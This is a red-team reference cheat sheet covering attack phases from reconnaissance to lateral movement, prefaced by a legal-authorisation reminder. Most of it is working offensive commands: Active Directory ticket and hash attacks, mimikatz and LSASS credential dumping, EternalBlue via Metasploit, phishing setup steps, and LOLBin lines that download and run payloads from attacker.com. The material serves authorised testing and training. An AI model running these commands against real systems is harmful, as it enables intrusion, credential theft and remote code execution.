# 🎯 Red Teaming

> Adversary simulation, network exploitation, and full-scope offensive security operations.

Red teaming replicates the tactics, techniques, and procedures (TTPs) of real-world threat actors to test whether an organisation's defences would detect and respond to an actual attack.

---

## ⚠️ Legal Reminder

**Only operate against systems you have explicit written authorisation to test.** Unauthorised access is illegal in virtually every jurisdiction. Always work under a signed Rules of Engagement (RoE) document.

---

## 🔴 Red Team Phases

```
1. Reconnaissance      → Gather intelligence (passive & active)
2. Initial Access      → Gain a foothold (phishing, web vulns, exposed services)
3. Execution           → Run payloads on the target system
4. Persistence         → Maintain access across reboots and credential changes
5. Privilege Escalation → Move from low-priv to SYSTEM/root/domain admin
6. Defense Evasion     → Avoid detection by AV, EDR, SIEM
7. Credential Access   → Dump hashes, tokens, tickets
8. Lateral Movement    → Pivot to other hosts in the network
9. Collection          → Find and stage data of interest
10. Exfiltration       → Move data out of the network
11. Impact             → Achieve the operation's objective
```

Reference: [MITRE ATT&CK Framework](https://attack.mitre.org)

---

## 🕵️ Reconnaissance

### Passive Recon (No Contact With Target)
```bash
# WHOIS / DNS
whois target.com
dig target.com ANY +noall +answer
dig @8.8.8.8 target.com MX

# Certificate transparency
curl "https://crt.sh/?q=%.target.com&output=json" | python3 -m json.tool | grep name_value

# Subdomain enumeration (passive)
subfinder -d target.com -o subs.txt
amass enum -passive -d target.com

# Technology fingerprinting
whatweb https://target.com
curl -s https://target.com | grep -i "generator\|powered\|version"

# Shodan (indexed internet assets)
shodan search 'org:"Target Organisation"'
shodan host <ip>

# ASN / IP range lookup
whois -h whois.radb.net -- '-i origin AS12345'
# https://bgp.he.net
```

### Active Recon
```bash
# Port scanning
nmap -sC -sV -oA initial_scan target.com
nmap -p- --min-rate 5000 -oA full_scan target.com
nmap -sU --top-ports 100 target.com                  # UDP top 100

# Service version scan
nmap -sV --version-intensity 9 -p 80,443,8080 target.com

# OS detection
nmap -O target.com

# Scan through proxy
proxychains nmap -sT target.com
```

### Web Recon
```bash
# Directory/file discovery
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Virtual host / subdomain fuzzing
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -fs <default_size>

# Parameter discovery
ffuf -u https://target.com/page?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

---

## 🎣 Phishing & Initial Access

### Email Phishing
```
1. Clone a trusted site with gophish or evilginx2
2. Craft lure email — invoice, password reset, urgent HR notice
3. Host payload (Office macro, ISO, LNK) or credential harvester
4. Send via typosquatted domain with valid TLS cert
5. Monitor for callbacks
```

### Tools
| Tool | Purpose |
|---|---|
| [GoPhish](https://getgophish.com) | Phishing campaign management |
| [Evilginx2](https://github.com/kgretzky/evilginx2) | Reverse proxy credential harvester (bypasses MFA) |
| [Modlishka](https://github.com/drk1wi/Modlishka) | Another reverse proxy phishing framework |
| [SET (Social-Engineer Toolkit)](https://github.com/trustedsec/social-engineer-toolkit) | Phishing and social engineering automation |

### Spear Phishing Checklist
```
[ ] Register look-alike domain (target-corp.com vs targetcorp.com)
[ ] Obtain valid TLS cert (Let's Encrypt)
[ ] Set up SPF, DKIM, DMARC records to pass email filters
[ ] Test deliverability with mail-tester.com
[ ] Craft pretext from LinkedIn / OSINT research
[ ] Prepare payload (macro, LNK, HTA, ISO)
[ ] Track opens and clicks in GoPhish
```

---

## 🏠 Active Directory Attacks

### Enumeration
```bash
# With valid credentials
# BloodHound data collection
bloodhound-python -u user -p 'Password123' -d target.local -dc dc01.target.local -c All

# PowerView (on Windows target)
Get-NetDomain
Get-NetUser | select name,memberof,lastlogon
Get-NetGroup -GroupName "Domain Admins"
Get-NetComputer | select name,operatingsystem
Find-LocalAdminAccess   # find machines where current user is local admin
Invoke-ACLScanner       # find misconfigured ACLs

# ldapdomaindump
ldapdomaindump -u 'target\user' -p 'Password123' dc01.target.local
```

### Kerberoasting
```bash
# Dump SPNs for offline cracking
impacket-GetUserSPNs target.local/user:Password123 -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt

# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting
```bash
# Users with "Do not require Kerberos pre-authentication"
impacket-GetNPUsers target.local/ -dc-ip 10.10.10.1 -usersfile users.txt -no-pass -request

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash / Pass-the-Ticket
```bash
# Pass-the-Hash with impacket
impacket-psexec 'target/administrator@10.10.10.1' -hashes :ntlm_hash

# Pass-the-Ticket with mimikatz
sekurlsa::tickets /export
kerberos::ptt ticket.kirbi

# Overpass-the-Hash (PTH → TGT)
sekurlsa::pth /user:admin /domain:target.local /ntlm:<hash>
```

### DCSync (Domain Replication)
```bash
# Requires DS-Replication-Get-Changes-All privilege (DA or equivalent)
impacket-secretsdump 'target.local/domainadmin:Password123@10.10.10.1'
# Or with mimikatz:
lsadump::dcsync /domain:target.local /user:administrator
```

### Golden / Silver Tickets
```bash
# Golden Ticket (requires KRBTGT hash)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain target.local -spn cifs/dc01 Administrator

# Silver Ticket (requires service account hash)
impacket-ticketer -nthash <service_hash> -domain-sid S-1-5-21-... -domain target.local -spn cifs/fileserver01 user
```

---

## 🔓 Privilege Escalation

### Linux
```bash
# Automated enumeration
./linpeas.sh | tee linpeas.out
./linux-smart-enumeration/lse.sh -l1

# SUID binaries
find / -perm -u=s -type f 2>/dev/null
# Check GTFOBins: https://gtfobins.github.io

# Sudo rights
sudo -l

# Writable cron jobs
crontab -l
cat /etc/cron*
ls -la /var/spool/cron/

# Capabilities
getcap -r / 2>/dev/null

# World-writable files / scripts run as root
find / -writable -type f 2>/dev/null | grep -v proc
```

### Windows
```powershell
# Automated enumeration
.\winPEAS.exe
.\Seatbelt.exe -group=all

# Service misconfigurations
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
sc qc VulnService

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\" | findstr /i /v """

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Token impersonation (SeImpersonatePrivilege)
# Use PrintSpoofer, RoguePotato, or GodPotato
.\PrintSpoofer.exe -i -c cmd
```

---

## 🎭 Defense Evasion

### AV / EDR Evasion
```
Techniques (conceptual — implementations vary):
- Payload obfuscation (encoding, encryption, packing)
- Process hollowing / injection (runPE, shellcode injection)
- Living-off-the-land binaries (LOLBins): mshta, regsvr32, certutil, wscript
- AMSI bypass (patch AmsiScanBuffer in memory)
- ETW patching (blind event tracing)
- Parent process spoofing
- Timestomping artefacts
- Signed binary proxy execution (DLL sideloading)
```

### LOLBins Quick Reference
```cmd
# Download file via certutil
certutil.exe -urlcache -f http://attacker.com/payload.exe payload.exe

# Execute via mshta
mshta.exe http://attacker.com/payload.hta

# Encoded PowerShell
powershell -enc <base64_encoded_command>

# Regsvr32 (squiblydoo)
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
```

---

## 🚀 Command & Control (C2)

### Popular C2 Frameworks
| Framework | Notes |
|---|---|
| [Cobalt Strike](https://www.cobaltstrike.com) | Industry standard (commercial); Beacon implant |
| [Metasploit](https://www.metasploit.com) | Open source; Meterpreter sessions |
| [Sliver](https://github.com/BishopFox/sliver) | Open source, modern; mTLS/WireGuard comms |
| [Havoc](https://github.com/HavocFramework/Havoc) | Open source; Demon implant |
| [Covenant](https://github.com/cobbr/Covenant) | .NET-based; Grunt implant |
| [Brute Ratel C4](https://bruteratel.com) | Commercial; EDR-aware (use only if licensed) |

### Metasploit Essentials
```bash
# Start
msfconsole -q

# Search and use
search type:exploit name:ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.1
set LHOST 10.10.14.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# Post-exploitation
meterpreter> getsystem
meterpreter> hashdump
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> run post/multi/recon/local_exploit_suggester
```

---

## 🔄 Lateral Movement

```bash
# PSExec (admin share + service)
impacket-psexec target.local/admin:Password123@10.10.10.5
impacket-psexec -hashes :ntlm_hash target.local/admin@10.10.10.5

# WMI execution
impacket-wmiexec target.local/admin:Password123@10.10.10.5

# SMB exec
impacket-smbexec target.local/admin:Password123@10.10.10.5

# WinRM / Evil-WinRM (if port 5985/5986 open)
evil-winrm -i 10.10.10.5 -u admin -p 'Password123'
evil-winrm -i 10.10.10.5 -u admin -H ntlm_hash

# SSH tunneling
ssh -L 3389:10.10.10.5:3389 user@jump_host   # RDP through pivot
ssh -D 1080 user@jump_host                   # SOCKS5 proxy

# Proxychains setup
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT 10.10.10.0/24
```

---

## 🗄️ Credential Access

```bash
# Dump SAM / SYSTEM (local hashes)
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# LSASS dump (on target — requires SYSTEM or SeDebugPrivilege)
# Task Manager → Details → lsass.exe → Create dump file
# procdump.exe -accepteula -ma lsass.exe lsass.dmp
# rundll32.exe comsvcs.dll, MiniDump <lsass_pid> lsass.dmp full

# Process dump offline
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL   # from DC

# Mimikatz
privilege::debug
sekurlsa::logonpasswords   # plaintext creds (if WDigest enabled)
sekurlsa::wdigest          # enable WDigest (requires reboot or re-login to populate)
lsadump::sam               # SAM database
lsadump::lsa /patch        # LSA secrets
```

---

## 📡 Network Exploitation

### Common Services
```bash
# SMB
smbclient -L //10.10.10.1 -N           # list shares (null session)
smbclient //10.10.10.1/share -U user
enum4linux-ng 10.10.10.1

# FTP
ftp 10.10.10.1
# Try anonymous login: user=anonymous, pass=anonymous

# SSH brute-force (last resort — noisy)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1

# RDP
xfreerdp /v:10.10.10.1 /u:admin /p:'Password123' /dynamic-resolution

# MSSQL
impacket-mssqlclient target/sa:Password123@10.10.10.1
# Execute OS commands if sysadmin:
SQL> EXEC xp_cmdshell 'whoami';
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

---

## 📋 Engagement Checklist

```
Pre-Engagement:
[ ] Signed Rules of Engagement and scope document
[ ] Emergency contact list (client + team leads)
[ ] Defined start/end times and out-of-scope systems
[ ] Backup and restore plan for any destructive testing

Execution:
[ ] Timestamped notes for every action taken
[ ] Screenshot or log evidence of every finding
[ ] Track all artifacts deployed (implants, tools) for cleanup
[ ] Daily sync with team lead

Post-Engagement:
[ ] Remove all implants, backdoors, and created accounts
[ ] Restore any modified settings
[ ] Compile full timeline of activities
[ ] Deliver written report: exec summary + technical findings + remediation
```

---

## 📚 Resources

- [MITRE ATT&CK](https://attack.mitre.org) — adversary TTP knowledge base
- [HackTricks](https://book.hacktricks.xyz) — comprehensive offensive techniques reference
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — payload and bypass cheatsheets
- [GTFOBins](https://gtfobins.github.io) — Unix binary privilege escalation
- [LOLBAS](https://lolbas-project.github.io) — Windows living-off-the-land binaries
- [BloodHound docs](https://bloodhound.readthedocs.io) — AD attack path analysis
- [impacket examples](https://github.com/fortra/impacket/tree/master/examples) — Python AD/SMB tooling
- [Red Team Notes (0xBEN)](https://notes.benheater.com) — structured red team methodology notes
- [The Hacker Playbook 3](https://www.thehackerplaybook.com) — red team field guide
